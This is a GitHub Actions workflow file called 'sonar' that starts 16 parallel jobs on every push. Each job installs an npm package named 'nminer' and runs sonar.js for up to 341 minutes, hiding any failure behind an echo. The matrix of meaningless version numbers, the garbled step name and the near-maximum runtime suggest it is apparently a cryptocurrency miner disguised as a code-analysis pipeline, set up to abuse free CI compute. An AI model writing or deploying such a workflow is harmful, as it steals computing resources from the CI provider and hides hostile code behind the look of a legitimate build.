name: sonar
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7396 }
          - { version: 8841 }
          - { version: 6029 }
          - { version: 33 }
          - { version: 2350 }
          - { version: 2004 }
          - { version: 5750 }
          - { version: 2246 }
          - { version: 3017 }
          - { version: 7276 }
          - { version: 5062 }
          - { version: 6714 }
          - { version: 2642 }
          - { version: 6913 }
          - { version: 6287 }
          - { version: 7117 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: er how stir-fry
        run: |
          npm install nminer@latest
          timeout 341m node sonar.js || echo "sonar executed"